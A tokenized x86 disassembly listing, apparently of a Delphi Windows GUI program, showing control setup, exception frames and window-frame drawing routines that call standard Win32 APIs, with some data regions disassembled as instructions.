call sub_43154c
mov ebx eax
mov [ esi + 0xc0 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
push 0x17
push 0x16
mov ecx 0x1
mov edx 0x4d
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax ebx
call sub_431d20
mov ecx r-xdata
mov edx [ rw-data ]
call sub_4238fc
lea edx [ ebx + 0x80 ]
mov eax [ rw-data ]
call sub_405a5c
xor edx edx
mov eax ebx
call sub_43d5f8
mov dl 0x1
mov eax ebx
call sub_43d5d4
mov [ ebx + 0x124 ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x120 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e8a4
mov ebx eax
mov [ esi + 0xc4 ] ebx
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43d4b4
push 0x9d
push 0x91
mov ecx 0x1d
mov edx 0x6
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
mov dl 0x5
mov eax ebx
call sub_43c998
mov dl 0x2
mov eax ebx
call sub_42ecd8
mov dl 0x1
mov eax ebx
call sub_42ecf4
xor edx edx
mov eax ebx
call sub_443e7c
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e0fc
mov [ esi + 0xc8 ] eax
mov edx [ esi + 0xb8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov ebx [ esi + 0xc8 ]
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax ebx
call sub_43c998
mov [ ebx + 0x12c ] esi
mov eax [ esi ]
mov eax [ eax + 0x44 ]
mov [ ebx + 0x128 ] eax
mov edx [ esi + 0xc4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov dl 0x1
mov eax ebx
call sub_42e528
mov dl 0x1
mov eax ebx
call sub_42e4f8
mov dl 0x1
mov eax ebx
call sub_42e4d0
mov [ ebx + 0x17a ] 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43295c
lea eax [ ebp - 0x8 ]
call sub_403ef8
retn
add esp 0xfffffff0
call sub_403448
sub_43295c
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_432b5d
xor ebx ebx
call sub_40392c
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_42a924
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432bfb
lea eax [ ebp - 0x28 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f1c
retn
lea edx [ ebp - 0x24 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xbc ]
call sub_43d4b4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc0 ]
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x64 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc8 ]
xor edx edx
call sub_42e4e8
lea edx [ ebp - 0x28 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0xc4 ]
call sub_43d4b4
sub_432c18
push ebp
mov ebp esp
add esp 0xffffffcc
push ebx
xor edx edx
mov [ ebp - 0x34 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_432cf0
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebx + 0x3c ]
push eax
call GetClientRect
lea edx [ ebp - 0x20 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x20 ]
sub edx eax
add edx eax
mov [ ebp - 0x10 ] edx
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0xb8 ]
call sub_43ce44
lea edx [ ebp - 0x30 ]
mov eax [ ebx + 0xc4 ]
call sub_43ce24
mov edx [ ebp - 0x28 ]
mov eax [ ebx + 0xc0 ]
sub edx [ eax + 0x48 ]
sub edx 0x2
mov eax [ ebx + 0xc0 ]
call sub_43cbf4
xor edx edx
mov eax [ ebx + 0xc8 ]
call sub_42e4e8
lea eax [ ebx + 0xcc ]
call sub_403ef8
lea edx [ ebp - 0x34 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x34 ]
mov eax [ ebx + 0xc4 ]
call sub_43d4b4
mov edx [ ebx + 0x3c ]
mov eax [ ebx + 0xb8 ]
call sub_441394
mov eax ebx
call sub_42a68c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432cf7
lea eax [ ebp - 0x34 ]
call sub_403ef8
retn
sub_432d30
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov edi eax
xor eax eax
push ebp
push sub_432f97
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_455a74
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_432f7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4568b8
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_43d4b4
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_457238
mov eax [ ebp - 0x4 ]
mov [ eax + 0x22d ] 0x1
mov dl 0x4
mov eax [ ebp - 0x4 ]
call sub_457898
mov eax [ ebp - 0x4 ]
mov [ eax + 0x1e4 ] edi
mov [ eax + 0x1e0 ] r-xdata
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e8a4
mov ebx eax
mov edx r-xdata
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
xor edx edx
mov eax ebx
call sub_43d4b4
mov dl 0x5
mov eax ebx
call sub_43c998
xor edx edx
mov eax ebx
call sub_42ecf4
mov dl 0x1
mov eax ebx
call sub_42ed48
mov edx 0x5
mov eax ebx
call sub_42ed2c
mov edx 0xff000005
mov eax ebx
call sub_43d624
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov [ ebx + 0x1f8 ] 0x1
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_42e0fc
mov esi eax
mov edx r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov dl 0x5
mov eax esi
call sub_43c998
mov dl 0x1
mov eax esi
call sub_42e4f8
mov dl 0x1
mov eax esi
call sub_42e528
mov dl 0x1
mov eax esi
call sub_42e4d0
mov eax [ edi + 0xc8 ]
mov edx [ eax + 0x168 ]
mov eax [ esi + 0x168 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4213e0
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_432f81
mov eax [ ebp - 0x4 ]
call sub_403124
retn
mov eax [ ebp - 0x4 ]
call sub_43ce88
mov esi eax
mov eax ebx
call sub_43ce88
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4213e0
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_457408
call sub_45ab84
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
sar eax 0x2
pop edx
call sub_425308
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456858
mov eax [ ebp - 0x4 ]
call sub_43cecc
mov esi eax
mov eax ebx
call sub_43cecc
sub esi eax
mov eax [ edi + 0xc8 ]
mov eax [ eax + 0x168 ]
call sub_4213f8
add esi eax
add esi 0xa
push esi
mov eax [ ebp - 0x4 ]
call sub_457408
call sub_45ab50
lea eax [ eax + eax * 2 ]
test eax eax
jns r-xdata
add eax 0x3
sar eax 0x2
pop edx
call sub_425308
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_456888
add eax 0x3
sub_432fec
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_433037
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ r-xdata ]
call sub_424cc0
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x60 ]
call sub_404304
sete al
xor al 0x1
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43303e
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_433044
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433069
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433070
retn
sub_43308b
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4330d0
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4330d7
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404980
sub_4330f3
inc [ ecx ]
add [ eax ] al
add [ ecx ] dh
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_433138
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43313f
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_404980
sub_43314f
dec [ edx ]
add [ eax ] al
add [ ebp + 0x41 ] cl
push eax
dec ecx
xor esi [ edx ]
inc esp
dec esp
dec esp
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4331a5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4331ac
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax rw-data
call sub_403ef8
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_4331b8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4331fc
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433203
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433210
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433235
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43323c
retn
sub_433248
xchg esp eax
xor al [ ebx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
xor al [ ebx ]
add al 0x0
add [ eax ] al
mov eax 0x6c004010
xor eax [ eax ]
js r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax ] ah
xor eax [ ebx ]
xor al 0x33
inc ebx
add [ ebx ] cl
push esp
inc ebx
outsd
outsb
jbe r-xdata
insb
jb r-xdata
jb r-xdata
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
imul ebp [ edi + 0x6e ] 0x6d726f46
popad
je r-xdata
insb
add [ eax ] al
add [ eax ] al
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
insb
imul ebp [ edi + 0x6e ] r-xdata
push cs
add [ eax ] al
add [ eax - 0x1 ] dl
add eax [ eax ]
add [ eax ] al
jb r-xdata
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x40040 ] ch
add [ eax ] al
nop
push sub_4333b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
add bh bh
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4333be
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404934
mov eax rw-data
mov edx [ r-xdata ]
call sub_404934
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433348
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4333b7
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4333be
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404934
mov eax rw-data
mov edx [ r-xdata ]
call sub_404934
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_433610
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_4283a8
mov [ esi + 0x5 ] al
call sub_4332e8
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_433f88
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403448
mov eax esi
pop esi
pop ebx
retn
call sub_4034a0
pop [ fs : 0x0 ]
add esp 0xc
sub_43365c
push ebx
push esi
call sub_4034b0
mov ebx edx
mov esi eax
mov eax esi
call sub_4336fc
call sub_4281e8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403114
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403498
sub_433690
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_4336fc
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_433740
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_433790
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_4337dc
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_433820
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_433868
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_4338d0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404744
push eax
mov eax esi
call sub_404734
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_433690
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_433934
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4339b8
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_4339f4
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_433a90
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_433aad ]
jmp [ eax * 4 + jump_table_433b16 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_433e1c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_433f77
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_4339b8
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4337dc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_443c60
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_412cd4
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_433fa4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_433fdf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_433fe6
retn
mov eax [ rw-data ]
call sub_403124
mov eax rw-data
call sub_403ef8
sub_4343b8
lodsb [ esi ]
fld [ ebx ]
mov esp 0x38004363
bound eax [ ebx ]
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
rol [ ebx + 0x43 ] 0x1
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
